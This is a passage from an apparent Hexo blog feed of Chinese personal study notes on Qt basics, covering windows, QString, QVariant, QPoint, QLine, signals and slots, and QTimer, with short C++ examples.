class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<span class="hljs-comment"># 遍历</span><br>    file.write(<span class="hljs-string">&quot;this a string&quot;</span>)<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qt随记</title>
    <link href="/2023/06/29/QT/qt%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/06/29/QT/qt%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>QT的输出是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;i&#x27;m august&quot;</span>;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QT</title>
    <link href="/2023/06/26/QT/QT/"/>
    <url>/2023/06/26/QT/QT/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="QT"><a href="#QT" class="headerlink" title="QT"></a>QT</h1><h2 id="认识QT"><a href="#认识QT" class="headerlink" title="认识QT"></a>认识QT</h2><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230627140342469.png"></p><ol><li><p>添加窗口</p><ol><li><p>在项目名的位置添加新的文件</p></li><li><p>在<code>mainwindow.cpp</code>里面的构造函数在新建一个自己的窗口类名</p></li><li><p>通过<code>new</code>指定父对象经行选择是内嵌的窗口还是在外的</p></li><li><p>调用<code>show</code>方法才能显示窗口</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++">MainWindow::<span class="hljs-built_in">MainWindow</span>(QWidget *parent) :<br>    <span class="hljs-built_in">QMainWindow</span>(parent),<br>    <span class="hljs-built_in">ui</span>(<span class="hljs-keyword">new</span> Ui::MainWindow)<br>&#123;<br>    ui-&gt;<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    FormTest* test=<span class="hljs-keyword">new</span> FormTest;<br>    test-&gt;<span class="hljs-built_in">show</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    FormTest* test2=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FormTest</span>(<span class="hljs-keyword">this</span>);<br>    test2-&gt;<span class="hljs-built_in">show</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br>      <br>MainWindow::~<span class="hljs-built_in">MainWindow</span>()<br>&#123;<br>    <span class="hljs-keyword">delete</span> ui;<br>&#125;<br>      <br></code></pre></td></tr></table></figure></li></ol></li><li><p><code>QDialog</code>介绍</p><ul><li>因为该窗口不是嵌入的，所以只有自己调用自己才能显示</li><li>模态显示和非模态显示<ul><li>非模态显示不能进行窗口切换，程序会堵塞，只有关闭窗口才会向下进行</li></ul></li></ul></li><li><p>Qmainwindow</p><ul><li>具有工具栏和状态栏</li></ul></li><li><p>QT的坐标系</p><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230628082141502.png"></p></li><li><p>创建按钮，并移动和管理大小</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">    <span class="hljs-comment">//创建按钮</span><br>QPushButton* butA=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPushButton</span>(<span class="hljs-keyword">this</span>);<br>butA-&gt;<span class="hljs-built_in">move</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//相对于父类坐标系的位置</span><br>butA-&gt;<span class="hljs-built_in">setFixedSize</span>(<span class="hljs-number">100</span>,<span class="hljs-number">100</span>);<span class="hljs-comment">//控制按钮的大小</span><br>   <br>QPushButton* butB=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPushButton</span>(butA);<br>butB-&gt;<span class="hljs-built_in">move</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<br>butB-&gt;<span class="hljs-built_in">setFixedSize</span>(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>);<br>   <br></code></pre></td></tr></table></figure></li><li><p>QT的内存机制</p><ul><li>​会回收<code>QObjetc</code>及其子类的内存</li></ul><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230628125338281.png"></p></li></ol><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><ol><li>封装了c++的基本类型</li><li>建议使用c++原本的类型</li></ol><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230629175549828.png" alt="image-20230629175549828"></p><ul><li><p>构造函数</p><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230629175753092.png"></p></li><li><p>添加到尾部</p><ul><li><code>append</code></li><li><code>push_back</code></li></ul></li><li><p>转换关系</p><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230629214952983.png" alt="image-20230629214952983"></p></li><li><p><code>Qstring</code>的格式化</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">QString qString=<span class="hljs-built_in">QString</span>(<span class="hljs-string">&quot;this is a test for arg: my girlfriend is %1, and my wife is %2&quot;</span>).<span class="hljs-built_in">arg</span>(<span class="hljs-string">&quot;zjy&quot;</span>).<span class="hljs-built_in">arg</span>(<span class="hljs-string">&quot;zjy2&quot;</span>);<br>    <br></code></pre></td></tr></table></figure></li><li><p><code>QString</code>和<code>QArray</code></p></li></ul><h3 id="Qvariant"><a href="#Qvariant" class="headerlink" title="Qvariant"></a>Qvariant</h3><ol><li>创建对象的方法<ul><li>使用带参构造</li><li>创建空对象，然会调用<code>setvalue</code>方法</li><li>使用静态函数</li></ul></li><li>使用方法<ul><li>调用<code>type()</code>方法  -&gt;  <code>to...()</code></li></ul></li></ol><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><ul><li><p>创建不能像普通的c++那样，必须使用宏声明一下</p><p>宏：<code>Q_DECLARE_METATYPE(MyTest)</code></p><figure class="highlight qt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs qt">struct <span class="hljs-title">myTest</span>&#123;<br>    <span class="hljs-built_in">int</span> testInt;<br>    <span class="hljs-built_in">double</span> testDouble;<br>&#125;;<br>Q_DECLARE_METATYPE(MyTest)<br></code></pre></td></tr></table></figure></li></ul><h3 id="QPoint"><a href="#QPoint" class="headerlink" title="QPoint"></a>QPoint</h3><ol><li><p>构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-comment">// 构造一个坐标原点, 即(0, 0)</span><br>QPoint::<span class="hljs-built_in">QPoint</span>();<br><span class="hljs-comment">// 参数为 x轴坐标, y轴坐标</span><br>QPoint::<span class="hljs-built_in">QPoint</span>(<span class="hljs-type">int</span> xpos, <span class="hljs-type">int</span> ypos);<br></code></pre></td></tr></table></figure></li><li><p>重新设置坐标点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//设置x,y的点    </span><br>qPonit.<span class="hljs-built_in">setX</span>(x);<br>   qPoint.<span class="hljs-built_in">setY</span>(y);<br>   <br></code></pre></td></tr></table></figure></li><li><p>部分代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++">    <span class="hljs-comment">//给QVariant使用自定义的类型</span><br>    myTest test1;<br>    test1.testInt=<span class="hljs-number">520</span>;<br>    test1.testDouble=<span class="hljs-number">13.14</span>;<br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 1</span><br>    QVariant v1;<br>    v1.<span class="hljs-built_in">setValue</span>(test1);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    QVariant v1=QVariant::<span class="hljs-built_in">fromValue</span>(test1);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">//调用QVariant</span><br>    <span class="hljs-keyword">if</span>(v1.<span class="hljs-built_in">canConvert</span>&lt;myTest&gt;())&#123;<br>        <span class="hljs-keyword">auto</span> tem=v1.<span class="hljs-built_in">value</span>&lt;myTest&gt;();<br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;tem.testInt&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>&lt;&lt;tem.testDouble;<br>    &#125;<br>   <br>    <span class="hljs-comment">//学习使用QPoint</span><br>    QPoint qPoint;<span class="hljs-comment">//坐标在0，0</span><br>    <span class="hljs-type">int</span> x=&#123;<span class="hljs-number">6</span>&#125;,y=&#123;<span class="hljs-number">5</span>&#125;;<br>    <span class="hljs-function">QPoint <span class="hljs-title">qPoint2</span><span class="hljs-params">(x,y)</span></span>;<span class="hljs-comment">//坐标在x,y</span><br>   <br>    <span class="hljs-comment">//重新设置x,y</span><br>    qPoint.<span class="hljs-built_in">setX</span>(x);<br>    qPoint.<span class="hljs-built_in">setY</span>(y);<br>   <br>    <span class="hljs-comment">//得到x,y的坐标</span><br>    x=qPoint.<span class="hljs-built_in">x</span>();<span class="hljs-comment">//得到值的拷贝</span><br>    y=qPoint.<span class="hljs-built_in">y</span>();<br>    <span class="hljs-keyword">auto</span> p_x=qPoint.<span class="hljs-built_in">rx</span>();<span class="hljs-comment">//得到引用</span><br>    <span class="hljs-keyword">auto</span> p_y=qPoint.<span class="hljs-built_in">ry</span>();<br>   <br>   <br>    <span class="hljs-built_in">qDebug</span>()&lt;&lt;p_x&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>&lt;&lt;p_y&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>&lt;&lt;x&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>&lt;&lt;y&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>;<br></code></pre></td></tr></table></figure></li></ol><h3 id="QLine"><a href="#QLine" class="headerlink" title="QLine"></a>QLine</h3><ol><li><p>直线类</p></li><li><p>构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-comment">// 构造一个空对象</span><br>QLine::<span class="hljs-built_in">QLine</span>();<br><span class="hljs-comment">// 构造一条直线, 通过两个坐标点</span><br>QLine::<span class="hljs-built_in">QLine</span>(<span class="hljs-type">const</span> QPoint &amp;p1, <span class="hljs-type">const</span> QPoint &amp;p2);<br><span class="hljs-comment">// 从点 (x1, y1) 到 (x2, y2)</span><br>QLine::<span class="hljs-built_in">QLine</span>(<span class="hljs-type">int</span> x1, <span class="hljs-type">int</span> y1, <span class="hljs-type">int</span> x2, <span class="hljs-type">int</span> y2);<br><br></code></pre></td></tr></table></figure></li><li><p>得到坐标或者点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">   <br><span class="hljs-comment">//获得点的坐标</span><br><span class="hljs-keyword">auto</span> x1_forGet=qLine2.<span class="hljs-built_in">x1</span>();<span class="hljs-comment">//返回x1的坐标点</span><br><span class="hljs-keyword">auto</span> y1_forGet=qLine2.<span class="hljs-built_in">y1</span>();<span class="hljs-comment">//返回x2的坐标点</span><br></code></pre></td></tr></table></figure></li><li><p>平移直线</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">     <br><span class="hljs-comment">//获得点的坐标</span><br><span class="hljs-keyword">auto</span> x1_forGet=qLine2.<span class="hljs-built_in">x1</span>();<span class="hljs-comment">//返回x1的坐标点</span><br><span class="hljs-keyword">auto</span> y1_forGet=qLine2.<span class="hljs-built_in">y1</span>();<span class="hljs-comment">//返回x2的坐标点</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="QSize"><a href="#QSize" class="headerlink" title="QSize"></a>QSize</h3><ol><li>有两个成员变量，具有长度和宽度</li></ol><h3 id="QRect"><a href="#QRect" class="headerlink" title="QRect"></a>QRect</h3><ol><li>用于描述一个矩形</li></ol><h3 id="Qdate"><a href="#Qdate" class="headerlink" title="Qdate"></a>Qdate</h3><ol><li>QDate 类可以封装日期信息也可以通过这个类得到日期相关的信息，包括: 年 , 月 , 日。</li></ol><h3 id="QTime"><a href="#QTime" class="headerlink" title="QTime"></a>QTime</h3><ol><li>QTime 类可以封装时间信息也可以通过这个类得到时间相关的信息，包括: 时 , 分 , 秒 , 毫秒。</li></ol><h3 id="QDtateTime"><a href="#QDtateTime" class="headerlink" title="QDtateTime"></a>QDtateTime</h3><ol><li>QDateTime 类可以封装日期和时间信息也可以通过这个类得到日期和时间相关的信息，包括: 年 , 月 , 日 , 时 , 分 , 秒 , 毫秒。其实这个类就是 QDate 和 QTime 这两个类的结合体。</li></ol><h2 id="信号和信号槽"><a href="#信号和信号槽" class="headerlink" title="信号和信号槽"></a>信号和信号槽</h2><ol><li><p>信号和信号槽</p><blockquote><p>当某个事件发生之后，比如，按钮检测到自己被点击了一下，它就会发出一个信号（signal）。这种发出是没有目的的，类似广播。如果有对象对这个信号感兴趣，它就会使用连接（connect）函数，意思是，将想要处理的信号和自己的一个函数（称为槽（slot））绑定来处理这个信号。也就是说，当信号发出时，被连接的槽函数会自动被回调。这就类似观察者模式：当发生了感兴趣的事件，某一个操作就会被自动触发。</p></blockquote></li><li><p>简单示范，绑定事件和信号</p><p>使用<code>connect()</code>绑定信号和信号槽</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//实现关闭窗口</span><br>    <span class="hljs-built_in">connect</span>(ui-&gt;closeBut,&amp;QPushButton::clicked,<span class="hljs-keyword">this</span>,MainWindow::close);<br></code></pre></td></tr></table></figure></li><li><p>信号的自定义</p><ul><li>自定义信号就是定义一个函数，但是这个函数是signals，权限的</li><li>自定义信号我们需要使用<code>Q_OBJECT</code>的宏然后就可以采用这个函数一调用这个信号。</li><li>而且该函数的返回值必须为空</li><li>信号是可以重载的</li></ul><blockquote><p>信号是类的成员函数<br>返回值必须是 void 类型<br>信号的名字可以根据实际情况进行指定<br>参数可以随意指定, 信号也支持重载<br>信号需要使用 signals 关键字进行声明, 使用方法类似于public等关键字<br>信号函数只需要声明, 不需要定义(没有函数体实现)<br>在程序中发射自定义信号: 发送信号的本质就是调用信号函数<br>习惯性在信号函数前加关键字: emit, 但是可以省略不写<br>emit只是显示的声明一下信号要被发射了, 没有特殊含义<br>底层 emit &#x3D;&#x3D; #define emit</p></blockquote></li><li><p>信号的使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">信号是类的成员函数<br>返回值必须是 <span class="hljs-type">void</span> 类型<br>信号的名字可以根据实际情况进行指定<br>参数可以随意指定, 信号也支持重载<br>信号需要使用 signals 关键字进行声明, 使用方法类似于<span class="hljs-keyword">public</span>等关键字<br>信号函数只需要声明, 不需要定义(没有函数体实现)<br>在程序中发射自定义信号: 发送信号的本质就是调用信号函数<br>习惯性在信号函数前加关键字: emit, 但是可以省略不写<br>emit只是显示的声明一下信号要被发射了, 没有特殊含义<br>底层 emit == <span class="hljs-meta">#<span class="hljs-keyword">define</span> emit</span><br>   <br></code></pre></td></tr></table></figure></li><li><p>槽函数的自定义</p><ul><li><p>使用关键词<code>slots</code>，可以省略，但是为了代码格式话，更好是使用这个关键词</p></li><li><p>返回值也必须是void</p></li><li><p>函数的参数和信号是的参数是一致的，但是如果对数据没有处理也可以不去接收</p></li><li><p>槽函数的类型是多样的，我们可以使用</p><p>伪函数，成员函数，匿名函数，全局函数</p><blockquote><p>返回值必须是 void 类型</p><p>槽也是函数, 因此也支持重载</p><p>槽函数需要指定多少个参数, 需要看连接的信号的参数个数</p><p>槽函数的参数是用来接收信号传递的数据的, 信号传递的数据就是信号的参数</p><p>举例:<br>信号函数: void testsig (int a, double b);<br>槽函数: void testslot (int a, double b);<br>总结:<br>槽函数的参数应该和对应的信号的参数个数，从左到右类型依次对应<br>信号的参数可以大于等于槽函数的参数个数 &#x3D;&#x3D; 信号传递的数据被忽略了<br>信号函数: void testsig (int a, double b);<br>槽函数: void testslot (int a);<br>Qt中槽函数的类型是多样的</p><p>Qt 中的槽函数可以是类的成员函数、全局函数、静态函数、Lambda表达式（匿名函数）</p><p>槽函数可以使用关键字进行声明: slots (Qt5中slots可以省略不写)</p><p>public slots:<br>private slots: –&gt; 这样的槽函数不能在类外部被调用<br>protected slots: –&gt; 这样的槽函数不能在类外部被调用</p></blockquote></li></ul></li><li><p>下面是使用实例</p><p>slot:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br>   <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QObject&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;QDebug&quot;</span></span><br>   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Qtslot</span>  : <span class="hljs-keyword">public</span> QObject<br>&#123;<br>    Q_OBJECT<br>   <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//Qtslot(QObject *parent);</span><br>    <span class="hljs-comment">//~Qtslot();</span><br>   <br><span class="hljs-keyword">public</span> slots:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_slot</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;eat shit!&quot;</span>;<br>    &#125;<br>&#125;;<br>   <br></code></pre></td></tr></table></figure><p>signal:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">   <br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br>   <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QObject&gt;</span></span><br>   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Qtgirl</span>  : <span class="hljs-keyword">public</span> QObject<br>&#123;<br>    Q_OBJECT<br>   <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//Qtgirl(QObject *parent);</span><br>    <span class="hljs-comment">//~Qtgirl();</span><br>   <br>signals:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_signal</span><span class="hljs-params">()</span></span>;<br>&#125;;<br>   <br></code></pre></td></tr></table></figure><p>信号槽的调用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;QtWidgetsApplication1.h&quot;</span></span><br>   <br>QtWidgetsApplication1::<span class="hljs-built_in">QtWidgetsApplication1</span>(QWidget *parent)<br>    : <span class="hljs-built_in">QMainWindow</span>(parent)<br>&#123;<br>    ui.<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>   <br>    <span class="hljs-comment">//创建信号槽</span><br>    qtslot = <span class="hljs-keyword">new</span> Qtslot;<br>    qtgirl = <span class="hljs-keyword">new</span> Qtgirl;<br>   <br>    <span class="hljs-built_in">connect</span>(qtgirl, &amp;Qtgirl::test_signal, qtslot, &amp;Qtslot::test_slot);<span class="hljs-comment">//注意函数参数的使用</span><br>   <br>   <br>    <span class="hljs-comment">//绑定按钮</span><br>    <span class="hljs-built_in">connect</span>(ui.eat, &amp;QPushButton::clicked, <span class="hljs-keyword">this</span>, &amp;QtWidgetsApplication1::launchSignal);<span class="hljs-comment">//最后一个参数不能使用()</span><br>   <br>&#125;<br>   <br>QtWidgetsApplication1::~<span class="hljs-built_in">QtWidgetsApplication1</span>()<br>&#123;&#125;<br>   <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QtWidgetsApplication1::launchSignal</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    emit qtgirl-&gt;<span class="hljs-built_in">test_signal</span>();<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li><li><p>信号槽的扩展</p><ul><li>一个信号可以使用槽函数</li><li>一个槽函数也可以是相关多个信号</li><li>可以使用信号连接信号，就可以不用使用<code>emit</code></li></ul></li><li><p>连接方式（对函数进行了重载）</p><ul><li><p>QT4</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">connect</span>(qtgirl, <span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">test_signal</span>()), qtslot,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">test_slot</span>()));<span class="hljs-comment">//注意函数参数的使用</span><br>   <br>   <span class="hljs-built_in">connect</span>(qtgirl, <span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">test_signal</span>(QString)), qtslot,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">test_slot</span>(QString)));<span class="hljs-comment">//注意函数参数的使用</span><br>     <br>        <br></code></pre></td></tr></table></figure></li><li><p>QT5</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//QT5  重载过后</span><br>     <br><span class="hljs-built_in">void</span>(Qtgirl:: * girl1)() = &amp;Qtgirl::test_signal;<br><span class="hljs-built_in">void</span>(Qtgirl:: * girl2)(QString) = &amp;Qtgirl::test_signal;<br>     <br><span class="hljs-built_in">void</span>(Qtslot:: * solt1)() = &amp;Qtslot::test_slot;<br><span class="hljs-built_in">void</span>(Qtslot:: * solt2)(QString) = &amp;Qtslot::test_slot;<br><span class="hljs-built_in">connect</span>(qtgirl, girl1, qtslot, solt1);<span class="hljs-comment">//注意函数参数的使用</span><br><span class="hljs-built_in">connect</span>(qtgirl, girl2, qtslot, solt2);<span class="hljs-comment">//注意函数参数的使用</span><br></code></pre></td></tr></table></figure><p>也就是需要我们将参数绑定在函数指针上面</p><p>返回值是void的函数指针</p></li><li><p>此外还要注意信号的使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QtWidgetsApplication1::launchSignal</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    emit qtgirl-&gt;<span class="hljs-built_in">test_signal</span>();<br>    emit qtgirl-&gt;<span class="hljs-built_in">test_signal</span>(<span class="hljs-string">&quot;Hamburger&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><code>lambda</code>表达式</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230723222647656.png" alt="image-20230723222647656"></p></li></ol><h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><h3 id="QTimer"><a href="#QTimer" class="headerlink" title="QTimer"></a>QTimer</h3><ol><li><p>构造函数</p><p>我们需要指定一个参数，让它挂在对象树上，可以进行内存回收</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230723224446185.png" alt="image-20230723224446185"></p></li><li><p>调用最好需要指定时间的间隔周期</p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\QT\QT.assets\image-20230723224534289.png" alt="image-20230723224534289"></p><p>如果没有指定间隔周期，需要调用如下的操作</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230723235424678.png" alt="image-20230723235424678"></p></li><li><p>调用的开始函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230723235538742.png" alt="image-20230723235538742"></p></li><li><p>发送信号</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230723235707087.png" alt="image-20230723235707087"></p><p>当timeout时就会发出信号，我们就需要槽函数接收信号</p></li><li><p>设置精度</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230723235900989.png" alt="image-20230723235900989"></p></li><li><p>看定时器是否是存活的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230724000157379.png" alt="image-20230724000157379"></p></li><li><p>设置信号只发射一次</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230724000353154.png" alt="image-20230724000353154"></p></li></ol><h4 id="简单的计时器的实现"><a href="#简单的计时器的实现" class="headerlink" title="简单的计时器的实现"></a>简单的计时器的实现</h4><figure 